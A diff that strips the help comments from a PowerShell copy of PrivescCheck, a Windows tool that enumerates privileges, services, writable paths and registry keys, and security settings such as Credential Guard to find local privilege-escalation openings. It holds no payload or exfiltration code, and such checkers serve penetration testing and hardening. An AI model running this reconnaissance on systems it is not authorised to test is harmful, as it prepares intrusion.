@@ -336,33 +336,12 @@ function script:Write-Header {
 # Original: https://github.com/itm4n/PrivescCheck  |  BSD 3-Clause  |  @itm4n
 # This copy sourced from: https://github.com/JoelGMSec/AutoRDPwn (mirror)
 # ===========================================================================
-<#
-    This scripts is an extended and updated version of PowerUp. I tried to filter out as many false
-    positives as I could and I also added some extra checks based on well known privilege escalation
-    cheat sheets (see links below).
-
-    Author: @itm4n
-    Credit: @harmj0y @mattifestation
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
-    
-    Links:
-        https://github.com/itm4n
-        https://github.com/HarmJ0y/PowerUp
-        https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-        https://book.hacktricks.xyz/windows/windows-local-privilege-escalation  
-#>
 
 
 # ----------------------------------------------------------------
 # Win32 stuff  
 # ----------------------------------------------------------------
 #region Win32
-<#
-https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
-https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-#>
 $CSharpSource = @'
 private const Int32 ANYSIZE_ARRAY = 1;
 
@@ -712,29 +691,6 @@ $global:IgnoredPrograms = @("Common Files", "Internet Explorer", "ModifiableWind
 $global:IgnoredServices = @("1394ohci", "3ware", "AarSvc", "ACPI", "AcpiDev", "acpiex", "acpipagr", "AcpiPmi", "acpitime", "Acx01000", "ADOVMPPackage", "ADP80XX", "adsi", "ADWS", "AeLookupSvc", "AFD", "afunix", "ahcache", "AJRouter", "ALG", "AllUserInstallAgent", "amdgpio2", "amdi2c", "AmdK8", "AmdPPM", "amdsata", "amdsbs", "amdxata", "AppID", "AppIDSvc", "Appinfo", "applockerfltr", "AppMgmt", "AppReadiness", "AppHostSvc", "AppVClient", "AppvStrm", "AppvVemgr", "AppvVfs", "AppXSvc", "arcsas", "aspnet_state", "AssignedAccessManagerSvc", "AsyncMac", "atapi", "AudioEndpointBuilder", "Audiosrv", "autotimesvc", "AxInstSV", "b06bdrv", "bam", "BasicDisplay", "BasicRender", "BattC", "BcastDVRUserService", "bcmfn2", "BDESVC", "Beep", "BFE", "bindflt", "BITS", "BluetoothUserService", "bowser", "BrokerInfrastructure", "Browser", "BTAGService", "BthA2dp", "BthAvctpSvc", "BthEnum", "BthHFEnum", "BthLEEnum", "BthMini", "BTHMODEM", "BthPan", "BTHPORT", "bthserv", "BTHUSB", "bttflt", "buttonconverter", "CAD", "camsvc", "CaptureService", "cbdhsvc", "cdfs", "CDPSvc", "CDPUserSvc", "cdrom", "CertPropSvc", "cht4iscsi", "cht4vbd", "CimFS", "circlass", "CldFlt", "CLFS", "ClipSVC", "CmBatt", "CNG", "cnghwassist", "CompositeBus", "COMSysApp", "condrv", "ConsentUxUserSvc", "CoreMessagingRegistrar", "CoreUI", "CredentialEnrollmentManagerUserSvc", "crypt32", "CryptSvc", "CSC", "CscService", "dam", "DCLocator", "DcomLaunch", "defragsvc", "DeviceAssociationBrokerSvc", "DeviceAssociationService", "DeviceInstall", "DevicePickerUserSvc", "DevicesFlowUserSvc", "DevQueryBroker", "Dfs", "Dfsc", "DFSR", "Dhcp", "diagnosticshub.standardcollector.service", "diagsvc", "DiagTrack", "disk", "DispBrokerDesktopSvc", "DisplayEnhancementService", "DmEnrollmentSvc", "dmvsc", "dmwappushservice", "DNS", "Dnscache", "DoSvc", "dot3svc", "DPS", "drmkaud", "DsmSvc", "DsRoleSvc", "DsSvc", "DusmSvc", "DXGKrnl", "e1i65x64", "Eaphost", "ebdrv", "EFS", "ehRecvr", "ehSched", "EhStorClass", "EhStorTcgDrv", "embeddedmode", "EntAppSvc", "ErrDev", "ESENT", "EventLog", "EventSystem", "exfat", "fastfat", "Fax", "fdc", "fdPHost", "FDResPub", "fhsvc", "FileCrypt", "FileInfo", "Filetrace", "flpydisk", "FltMgr", "FontCache", "FrameServer", "FsDepends", "Fs_Rec", "fvevol", "gencounter", "genericusbfn", "GPIOClx0101", "gpsvc", "GpuEnergyDrv", "GraphicsPerfSvc", "HdAudAddService", "HDAudBus", "HidBatt", "HidBth", "hidi2c", "hidinterrupt", "HidIr", "hidserv", "hidspi", "HidUsb", "hkmsvc", "HomeGroupListener", "HomeGroupProvider", "HpSAMD", "HTTP", "hvcrash", "HvHost", "hvservice", "HwNClx0101", "hwpolicy", "hyperkbd", "HyperVideo", "i8042prt", "iagpio", "iai2c", "iaStorAV", "iaStorAVC", "iaStorV", "ibbus", "icssvc", "idsvc", "IEEtwCollectorService", "IKEEXT", "IndirectKmd", "inetaccs", "InstallService", "intelide", "intelpep", "intelpmax", "intelppm", "iorate", "IPBusEnum", "IpFilterDriver", "iphlpsvc", "IPMIDRV", "IPNAT", "IPT", "IpxlatCfgSvc", "isapnp", "iScsiPrt", "IsmServ", "ItSas35i", "kbdclass", "kbdhid", "Kdc", "KdsSvc", "kdnic", "KeyIso", "KPSSVC", "KSecDD", "KSecPkg", "ksthunk", "KtmRm", "LanmanServer", "LanmanWorkstation", "ldap", "lfsvc", "LicenseManager", "lltdio", "lltdsvc", "lmhosts", "Lsa", "LSI_SAS", "LSI_SAS2i", "LSI_SAS3i", "LSI_SSS", "LSM", "luafv", "LxpSvc", "MapsBroker", "mausbhost", "mausbip", "MbbCx", "Mcx2Svc", "megasas", "megasas2i", "megasas35i", "megasr", "MessagingService", "Microsoft_Bluetooth_AvrcpTransport", "MixedRealityOpenXRSvc", "mlx4_bus", "MMCSS", "Modem", "monitor", "mouclass", "mouhid", "mountmgr", "mpsdrv", "mpssvc", "MRxDAV", "mrxsmb", "mrxsmb20", "MsBridge", "Msfs", "msgpiowin32", "mshidkmdf", "mshidumdf", "msisadrv", "MSiSCSI", "msiserver", "MSKSSRV", "MsLldp", "MSPCLOCK", "MSPQM", "MsQuic", "MsRPC", "MSSCNTRS", "MsSecFlt", "mssmbios", "MSTEE", "MTConfig", "Mup", "mvumis", "napagent", "NativeWifiP", "NaturalAuthentication", "NcaSvc", "NcbService", "NcdAutoSetup", "ndfltr", "NDIS", "NdisCap", "NdisImPlatform", "NdisTapi", "Ndisuio", "NdisVirtualBus", "NdisWan", "ndiswanlegacy", "NDKPing", "ndproxy", "Ndu", "NetAdapterCx", "NetBIOS", "NetbiosSmb", "NetBT", "NetMsmqActivator", "NetPipeActivator", "NetTcpActivator", "Netlogon", "Netman", "netprofm", "NetSetupSvc", "NetTcpPortSharing", "netvsc", "NgcCtnrSvc", "NgcSvc", "NlaSvc", "Npfs", "npsvctrig", "nsi", "nsiproxy", "NTDS", "Ntfs", "NtFrs", "Null", "nvdimm", "nvraid", "nvstor", "OneSyncSvc", "p2pimsvc", "p2psvc", "Parport", "partmgr", "PcaSvc", "pci", "pciide", "pcmcia", "pcw", "pdc", "PEAUTH", "PeerDistSvc", "PenService", "perceptionsimulation", "percsas2i", "percsas3i", "PerfDisk", "PerfHost", "PerfNet", "PerfOS", "PerfProc", "PhoneSvc", "PimIndexMaintenanceSvc", "PktMon", "pla", "PlugPlay", "pmem", "PNPMEM", "PNRPAutoReg", "PNRPsvc", "PolicyAgent", "portcfg", "PortProxy", "Power", "PptpMiniport", "PrintNotify", "PrintWorkflowUserSvc", "Processor", "ProfSvc", "ProtectedStorage", "Psched", "PushToInstall", "pvscsi", "QWAVE", "QWAVEdrv", "Ramdisk", "RasAcd", "RasAgileVpn", "RasAuto", "Rasl2tp", "RasMan", "RasPppoe", "RasSstp", "rdbss", "RDMANDK", "rdpbus", "RDPDR", "RDPNP", "RDPUDD", "RdpVideoMiniport", "rdyboost", "ReFS", "ReFSv1", "FCRegSvc", "RemoteAccess", "RemoteRegistry", "RetailDemo", "RFCOMM", "rhproxy", "RmSvc", "RpcEptMapper", "RpcLocator", "RpcSs", "RSoPProv", "rspndr", "s3cap", "sacsvr", "SamSs", "sbp2port", "SCardSvr", "ScDeviceEnum", "scfilter", "Schedule", "scmbus", "SCPolicySvc", "sdbus", "SDFRd", "SDRSVC", "sdstor", "seclogon", "SecurityHealthService", "SEMgrSvc", "SENS", "Sense", "SensorDataService", "SensorService", "SensrSvc", "SerCx", "SerCx2", "Serenum", "Serial", "sermouse", "SessionEnv", "sfloppy", "SgrmAgent", "SgrmBroker", "SharedAccess", "SharedRealitySvc", "ShellHWDetection", "shpamsvc", "SiSRaid2", "SiSRaid4", "SmartSAMD", "smbdirect", "smphost", "SmsRouter", "SMSvcHost 4.0.0.0", "SNMPTRAP", "spaceparser", "spaceport", "SpatialGraphFilter", "SpbCx", "spectrum", "Spooler", "sppsvc", "sppuinotify", "srv2", "srvnet", "SSDPSRV", "ssh-agent", "SstpSvc", "StateRepository", "stexstor", "stisvc", "storahci", "storflt", "stornvme", "storqosflt", "StorSvc", "storufs", "storvsc", "svsvc", "swenum", "swprv", "Synth3dVsc", "SysMain", "SystemEventsBroker", "TabletInputService", "TapiSrv", "Tcpip", "Tcpip6", "TCPIP6TUNNEL", "tcpipreg", "TCPIPTUNNEL", "tdx", "Telemetry", "terminpt", "TermService", "Themes", "TieringEngineService", "TimeBroker", "TimeBrokerSvc", "THREADORDER", "TokenBroker", "TPM", "TrkWks", "TroubleshootingSvc", "TrustedInstaller", "TSDDD", "TsUsbFlt", "TsUsbGD", "tsusbhub", "tunnel", "tzautoupdate", "UALSVC", "UASPStor", "UcmCx0101", "UcmTcpciCx0101", "UcmUcsiAcpiClient", "UcmUcsiCx0101", "Ucx01000", "UdeCx", "udfs", "UdkUserSvc", "UEFI", "UevAgentDriver", "UevAgentService", "Ufx01000", "UfxChipidea", "ufxsynopsys", "UGatherer", "UGTHRSVC", "UI0Detect", "umbus", "UmPass", "UmRdpService", "UnistoreSvc", "upnphost", "UrsChipidea", "UrsCx01000", "UrsSynopsys", "usbaudio", "usbaudio2", "usbccgp", "usbcir", "usbehci", "usbhub", "USBHUB3", "usbohci", "usbprint", "usbser", "USBSTOR", "usbuhci", "USBXHCI", "UserDataSvc", "UserManager", "UsoSvc", "UxSms", "VacSvc", "VaultSvc", "vdrvroot", "vds", "VerifierExt", "VGAuthService", "vhdmp", "vhf", "Vid", "VirtualRender", "vm3dmp", "vm3dmp-debug", "vm3dmp-stats", "vm3dmp_loader", "vmbus", "VMBusHID", "vmci", "vmgid", "vmhgfs", "vmicguestinterface", "vmicheartbeat", "vmickvpexchange", "vmicrdv", "vmicshutdown", "vmictimesync", "vmicvmsession", "vmicvss", "VMMemCtl", "vmmouse", "vmrawdsk", "vmusbmouse", "vmvss", "vmwefifw", "vmxnet3ndis6", "volmgr", "volmgrx", "volsnap", "volume", "vpci", "vsmraid", "vsock", "VSS", "VSTXRAID", "vwifibus", "vwififlt", "W32Time", "w3logsvc", "W3SVC", "WaaSMedicSvc", "WAS", "WacomPen", "WalletService", "wanarp", "wanarpv6", "WarpJITSvc", "WatAdminSvc", "wbengine", "WbioSrvc", "wcifs", "Wcmsvc", "wcncsvc", "wcnfs", "WcsPlugInService", "WdBoot", "Wdf01000", "WdFilter", "WdiServiceHost", "WdiSystemHost", "wdiwifi", "WdmCompanionFilter", "WdNisDrv", "WdNisSvc", "WebClient", "Wecsvc", "WEPHOSTSVC", "wercplsupport", "WerSvc", "WFDSConMgrSvc", "WFPLWFS", "WiaRpc", "WIMMount", "WinDefend", "Windows Workflow Foundation 4.0.0.0", "WindowsTrustedRT", "WindowsTrustedRTProxy", "WinHttpAutoProxySvc", "WinMad", "Winmgmt", "WinNat", "WinRM", "Winsock", "WinSock2", "WINUSB", "WinVerbs", "wisvc", "WlanSvc", "wlidsvc", "WLMS", "wlpasvc", "WManSvc", "WmiAcpi", "WmiApRpl", "wmiApSrv", "WMPNetworkSvc", "Wof", "workerdd", "workfolderssvc", "WpcMonSvc", "WPCSvc", "WPDBusEnum", "WpdUpFltr", "WpnService", "WpnUserService", "ws2ifsl", "wscsvc", "WSearch", "WSearchIdxPi", "WSService", "wuauserv", "WudfPf", "WUDFRd", "wudfsvc", "WwanSvc", "XblAuthManager", "XblGameSave", "xboxgip", "XboxGipSvc", "XboxNetApiSvc", "xinputhid", "xmlprov")
 
 function Convert-DateToString {
-    <#
-    .SYNOPSIS
-
-    Helper - Converts a DateTime object to a string representation
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The output string is a simplified version of the ISO format: YYYY-MM-DD hh:mm:ss. 
-    
-    .PARAMETER Date
-
-    A System.DateTime object
-    
-    .EXAMPLE
-
-    PS C:\> $Date = Get-Date; Convert-DateToString -Date $Date
-
-    2020-01-16 - 10:26:11
-    
-    #>
     
     [CmdletBinding()] param(
         [System.DateTime]
@@ -748,30 +704,6 @@ function Convert-DateToString {
 }
 
 function Convert-ServiceTypeToString {
-    <#
-    .SYNOPSIS
-
-    Helper - Converts a service type (integer) to its actual name
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Services have a type which is saved as an integer in the registry. This function will retrieve
-    the "name" of the type based on this integer value.
-    
-    .PARAMETER ServiceType
-
-    A service type as an integer
-    
-    .EXAMPLE
-
-    PS C:\> Convert-ServiceTypeToString -ServiceType 16
-    
-    Win32OwnProcess
-    
-    #>
     
     [CmdletBinding()] param(
         [int]
@@ -797,30 +729,6 @@ function Convert-ServiceTypeToString {
 }
 
 function Convert-ServiceStartModeToString {
-    <#
-    .SYNOPSIS
-
-    Helper - Convert a Start mode (integer) to its actual name
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Services have a Start mode (e.g.: Automatic), which is saved as an integer in the registry.
-    This function will retrieve the "name" of the Start mode based on this integer value. 
-    
-    .PARAMETER StartMode
-
-    A Start mode as an integer
-    
-    .EXAMPLE
-
-    PS C:\> Convert-ServiceStartModeToString -StartMode 2
-
-    Automatic
-
-    #>
     
     [CmdletBinding()] param(
         [int]
@@ -844,32 +752,6 @@ function Convert-ServiceStartModeToString {
 }
 
 function Test-IsKnownService {
-    <#
-    .SYNOPSIS
-
-    Helper - Compares a service name against a list of known service name patterns
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    In Windows 10, a lot of services were added. Although they are the same, their name will vary 
-    from an installation to another. The pattern of their name is "service_XXXXXXXX" where 
-    "XXXXXXXX" is random hexadecimal string which is "unique" to an installation of Windows. The
-    aim of this function is to determine whether a given service name matches this pattern.
-    
-    .PARAMETER ServiceName
-
-    The name of a service as a String
-    
-    .EXAMPLE
-
-    PS C:\> Test-IsKnownService -ServiceName 'CaptureService_1fe3b73d'
-    
-    True
-    
-    #>
     
     [CmdletBinding()] param(
         [string]
@@ -891,37 +773,6 @@ function Test-IsKnownService {
 }
 
 function Get-UserPrivileges {
-    <#
-    .SYNOPSIS
-
-    Helper - Enumerates the privileges of the current user 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Enumerates the privileges of the current user using the Windows API. First, it gets a handle 
-    to the current access token using OpenProcessToken. Then it calls GetTokenInformation to list
-    all the privileges that it contains along with their state (enabled/disabled). For each result
-    a custom object is returned, indicating the name of the privilege and its state. 
-    
-    .EXAMPLE
-
-    PS C:\> Get-UserPrivileges
-
-    Name                          State    Description
-    ----                          ------   -----------
-    SeShutdownPrivilege           Disabled Shut down the system
-    SeChangeNotifyPrivilege       Enabled  Bypass traverse checking
-    SeUndockPrivilege             Disabled Remove computer from docking station
-    SeIncreaseWorkingSetPrivilege Disabled Increase a process working set
-    SeTimeZonePrivilege           Disabled Change the time zone
-
-    .LINK
-
-    https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
-    #>
     
     [CmdletBinding()] param()
 
@@ -1085,34 +936,6 @@ function Get-UserPrivileges {
 }
 
 function Get-UserFromProcess() {
-    <#
-    .SYNOPSIS
-
-    Helper - Gets the user associated to a given process
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    First it gets a handle to the process identified by the given PID. Then, it uses this handle to
-    access the process token. GetTokenInformation() is then used to query the SID of the user.
-    Finally the SID is converted to a domain name, user name and SID type. All this information is
-    returned in a custom PS object. 
-    
-    .PARAMETER ProcessId
-
-    The PID of the target process
-    
-    .EXAMPLE
-
-    PS C:\> Get-UserFromProcess -ProcessId 6972
-
-    Domain          Username Type
-    ------          -------- ----
-    DESKTOP-FEOHNOM lab-user User
-    
-    #>
     
     [CmdletBinding()] param(
         [Parameter(Mandatory=$true)]
@@ -1237,54 +1060,6 @@ function Get-UserFromProcess() {
 }
 
 function Get-NetworkEndpoints {
-    <#
-    .SYNOPSIS
-
-    Helper - Gets a list of listening ports (TCP/UDP)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    It uses the 'GetExtendedTcpTable' and 'GetExtendedUdpTable' functions of the Windows API to 
-    list the TCP/UDP endpoints on the local machine. It handles both IPv4 and IPv6. For each 
-    entry in the table, a custom PS object is returned, indicating the IP version (IPv4/IPv6),
-    the protocol (TCP/UDP), the local address (e.g.: "0.0.0.0:445"), the state, the PID of the 
-    associated process and the name of the process. The name of the process is retrieved through
-    a call to "Get-Process -PID <PID>".
-    
-    .EXAMPLE
-
-    PS C:\> Get-NetworkEndpoints | ft
-    
-    IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
-    --   ----- ------------ --------- --------         -----       --- ----
-    IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
-    IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
-    IPv4 TCP   0.0.0.0           5040 0.0.0.0:5040     LISTENING  8580 svchost
-    IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
-    IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
-    IPv4 TCP   0.0.0.0          49666 0.0.0.0:49666    LISTENING  1852 svchost
-    IPv4 TCP   0.0.0.0          49667 0.0.0.0:49667    LISTENING  1860 svchost
-    IPv4 TCP   0.0.0.0          49668 0.0.0.0:49668    LISTENING  2972 svchost
-    IPv4 TCP   0.0.0.0          49669 0.0.0.0:49669    LISTENING  4480 spoolsv
-    IPv4 TCP   0.0.0.0          49670 0.0.0.0:49670    LISTENING   964 services
-    
-    .EXAMPLE
-
-    PS C:\> Get-NetworkEndpoints -UDP -IPv6 | ft
-
-    IP   Proto LocalAddress LocalPort Endpoint    State  PID Name       
-    --   ----- ------------ --------- --------    -----  --- ----
-    IPv6 UDP   ::                 500 [::]:500    N/A   5000 svchost
-    IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
-    IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
-    IPv6 UDP   ::                4500 [::]:4500   N/A   5000 svchost
-    IPv6 UDP   ::               62212 [::]:62212  N/A   4128 dasHost
-    IPv6 UDP   ::1               1900 [::1]:1900  N/A   5860 svchost
-    IPv6 UDP   ::1              63168 [::1]:63168 N/A   5860 svchost 
-    #>
 
     [CmdletBinding()] param(
         [switch]
@@ -1401,36 +1176,6 @@ function Get-NetworkEndpoints {
 }
 
 function Get-InstalledPrograms {
-    <#
-    .SYNOPSIS
-
-    Helper - Enumerates the installed applications 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    This looks for applications installed in the common "Program Files" and "Program Files (x86)" 
-    folders. It also enumerates installed applications thanks to the registry by looking for all
-    the subkeys in "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall".
-
-    .PARAMETER Filtered
-
-    If True, only non-default applications are returned. Otherwise, all the applications are 
-    returned. The filter is base on a list of known applications which are known to be installed
-    by default (e.g.: "Windows Defender").
-    
-    .EXAMPLE
-
-    PS C:\> Get-InstalledPrograms -Filtered
-
-    Mode                LastWriteTime     Length Name
-    ----                -------------     ------ ----
-    d----        29/11/2019     10:51            Npcap
-    d----        29/11/2019     10:51            Wireshark
-    
-    #>
     
     [CmdletBinding()] param(
         [switch]
@@ -1520,55 +1265,6 @@ function Get-ServiceFromRegistry {
 }
 
 function Get-ServiceList {
-    <#
-    .SYNOPSIS
-
-    Helper - Enumerates services (based on the registry)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    This uses the registry to enumerate the services by looking for the subkeys of 
-    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services". This allows any user to get information
-    about all the services. So, even if non-privileged users can't access the details of a service
-    through the Service Control Manager, they can do so simply by accessing the registry.
-    
-    .PARAMETER FilterLevel
-
-    This parameter can be used to filter out the result returned by the function based on the 
-    following criteria:
-        FilterLevel = 0 - No filtering 
-        FilterLevel = 1 - Exclude 'Services with empty ImagePath'
-        FilterLevel = 2 - Exclude 'Services with empty ImagePath' + 'Drivers' 
-        FilterLevel = 3 - Exclude 'Services with empty ImagePath' + 'Drivers' + 'Known services' 
-    
-    .EXAMPLE
-
-    PS C:\> Get-ServiceList -FilterLevel 3
-
-    Name         : VMTools
-    DisplayName  : VMware Tools
-    User         : LocalSystem
-    ImagePath    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
-    StartMode    : Automatic
-    Type         : Win32OwnProcess
-    RegistryKey  : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
-    RegistryPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
-    
-    .NOTES
-
-    A service "Type" can be one of the following:
-        KernelDriver = 1
-        FileSystemDriver = 2
-        Adapter = 4
-        RecognizerDriver = 8
-        Win32OwnProcess = 16
-        Win32ShareProcess = 32 
-        InteractiveProcess = 256
-
-    #>
     
     [CmdletBinding()] param(
         [Parameter(Mandatory=$true)]
@@ -1633,55 +1329,6 @@ function Get-ServiceList {
 }
 
 function Get-ModifiablePath {
-    <#
-    .SYNOPSIS
-
-    Parses a passed string containing multiple possible file/folder paths and returns
-    the file paths where the current user has modification rights.
-
-    Author: @harmj0y
-    License: BSD 3-Clause
-
-    .DESCRIPTION
-
-    Takes a complex path specification of an initial file/folder path with possible
-    configuration files, 'tokenizes' the string in a number of possible ways, and
-    enumerates the ACLs for each path that currently exists on the system. Any path that
-    the current user has modification rights on is returned in a custom object that contains
-    the modifiable path, associated permission set, and the IdentityReference with the specified
-    rights. The SID of the current user and any group he/she are a part of are used as the
-    comparison set against the parsed path DACLs.
-
-    @itm4n: I made some small changes to the original code in order to prevent false positives as
-    much as possible. 
-
-    .PARAMETER Path
-
-    The string path to parse for modifiable files. Required
-
-    .PARAMETER LiteralPaths
-
-    Switch. Treat all paths as literal (i.e. don't do 'tokenization').
-
-    .EXAMPLE
-
-    PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
-
-    Path                       Permissions                IdentityReference
-    ----                       -----------                -----------------
-    C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-    C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-
-    .EXAMPLE
-
-    PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath
-
-    Path                       Permissions                IdentityReference
-    ----                       -----------                -----------------
-    C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-    C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-    ...
-    #>
     
     [CmdletBinding()]
     Param(
@@ -1845,42 +1492,6 @@ function Get-ModifiablePath {
 }
 
 function Get-ModifiableRegistryPath {
-    <#
-    .SYNOPSIS
-
-    Helper - Checks the permissions of a given registry key and returns the ones that the current 
-    user can modify. It's based on the same technique as the one used by @harmj0y in 
-    "Get-ModifiablePath".
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Any registry path that the current user has modification rights on is returned in a custom 
-    object that contains the modifiable path, associated permission set, and the IdentityReference
-    with the specified rights. The SID of the current user and any group he/she are a part of are 
-    used as the comparison set against the parsed path DACLs.
-    
-    .PARAMETER Path
-
-    A registry key path. Required
-    
-    .EXAMPLE
-
-    Get-ModifiableRegistryPath -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService"
-
-    Name              : VulnService
-    ImagePath         : C:\APPS\MyApp\service.exe
-    User              : NT AUTHORITY\NetworkService
-    ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService}
-    IdentityReference : NT AUTHORITY\INTERACTIVE
-    Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadExtendedAttributes, ReadData/ListDirectory}
-    Status            : Running
-    UserCanStart      : True
-    UserCanRestart    : False
-    
-    #>
     
     [CmdletBinding()]
     Param(
@@ -1960,48 +1571,6 @@ function Get-ModifiableRegistryPath {
 }
 
 function Add-ServiceDacl {
-    <#
-    .SYNOPSIS
-
-    Adds a Dacl field to a service object returned by Get-Service.
-
-    Author: Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-
-    .DESCRIPTION
-
-    Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
-    Dacl field to each object. It does this by opening a handle with ReadControl for the
-    service with using the GetServiceHandle Win32 API call and then uses
-    QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
-
-    @itm4n: I had to make some small changes to the original code because i don't import the
-    Win32 API functions the same way it was done in PowerUp.
-
-    .PARAMETER Name
-
-    An array of one or more service names to add a service Dacl for. Passable on the pipeline.
-
-    .EXAMPLE
-
-    PS C:\> Get-Service | Add-ServiceDacl
-
-    Add Dacls for every service the current user can read.
-
-    .EXAMPLE
-
-    PS C:\> Get-Service -Name VMTools | Add-ServiceDacl
-
-    Add the Dacl to the VMTools service object.
-
-    .OUTPUTS
-
-    ServiceProcess.ServiceController
-
-    .LINK
-
-    https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-    #>
 
     [OutputType('ServiceProcess.ServiceController')]
     param (
@@ -2075,38 +1644,6 @@ function Add-ServiceDacl {
 }
 
 function Get-UEFIStatus {
-    <#
-    .SYNOPSIS
-
-    Helper - Gets the BIOS mode of the machine (Legacy / UEFI)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Invokes the "GetFirmwareEnvironmentVariable()" function from the Windows API with dummy 
-    parameters. Indeed, the queried value doesn't matter, what matters is the last error code,
-    which you can get by invoking "GetLastError()". If the return code is ERROR_INVALID_FUNCTION,
-    this means that the function is not supported by the BIOS so it's LEGACY. Otherwise, the error
-    code will indicate that it cannot find the requested variable, which means that the function is
-    supported by the BIOS so it's UEFI. 
-    
-    .EXAMPLE
-
-    PS C:\> Get-BiosMode
-
-    Name Status Description      
-    ---- ------ -----------
-    UEFI   True BIOS mode is UEFI
-    
-    .NOTES
-
-    https://github.com/xcat2/xcat-core/blob/master/xCAT-server/share/xcat/netboot/windows/detectefi.cpp
-    https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getfirmwareenvironmentvariablea
-    https://github.com/ChrisWarwick/GetUEFI/blob/master/GetFirmwareBIOSorUEFI.psm1
-
-    #>
 
     [CmdletBinding()]Param()
 
@@ -2161,29 +1698,6 @@ function Get-UEFIStatus {
 }
 
 function Get-SecureBootStatus {
-    <#
-    .SYNOPSIS
-    
-    Helper - Get the status of Secure Boot (enabled/disabled/unsupported)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    In case of a UEFI BIOS, you can check whether 'Secure Boot' is enabled by looking at the 
-    'UEFISecureBootEnabled' value of the following registry key: 'HKEY_LOCAL_MACHINE\SYSTEM\Current
-    ControlSet\Control\SecureBoot\State'. 
-    
-    .EXAMPLE
-
-    PS C:\> Get-SecureBootStatus
-
-    Name        Status Description
-    ----        ------ -----------
-    Secure Boot   True Secure Boot is enabled
-
-    #>
     
     [CmdletBinding()]Param()
 
@@ -2218,33 +1732,6 @@ function Get-SecureBootStatus {
 }
 
 function Get-CredentialGuardStatus {
-    <#
-    .SYNOPSIS
-
-    Helper - Gets the status of Windows Defender Credential Guard 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Gets the status of the Credential Guard by reading the 'LsaCfgFlags' value of the following 
-    registry key: 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA'. Possible values are:
-    None=>Not configured, 0=>Disabled, 1=>Enabled with UEFI lock, 2=>Disabled without UEFI lock.
-    
-    .EXAMPLE
-
-    PS C:\> Get-CredentialGuardStatus
-
-    Name             Status Description
-    ----             ------ -----------
-    Credential Guard  False Credential Guard is not configured
-    
-    .LINK
-
-    https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage
-
-    #>
     
     [CmdletBinding()]Param()
 
@@ -2287,32 +1774,6 @@ function Get-CredentialGuardStatus {
 }
 
 function Get-LsaRunAsPPLStatus {
-    <#
-    .SYNOPSIS
-
-    Helper - Gets the status of RunAsPPL option for LSA
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    RunAsPPL can be enabled for the LSA process in the registry. If it's enabled and the device has
-    Secure Boot or UEFI, this setting is stored in the UEFI firmware so removing the registry key 
-    won't disable this setting. 
-    
-    .EXAMPLE
-
-    PS C:\> Get-LsaRunAsPPLStatus
-    
-    Name     Status Description        
-    ----     ------ -----------
-    RunAsPPL   True RunAsPPL is enabled
-    
-    .LINK
-
-    https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
-    #>
     
 
     [CmdletBinding()]Param()
@@ -2357,62 +1818,6 @@ function Get-LsaRunAsPPLStatus {
 }
 
 function Get-UnattendSensitiveData {
-    <#
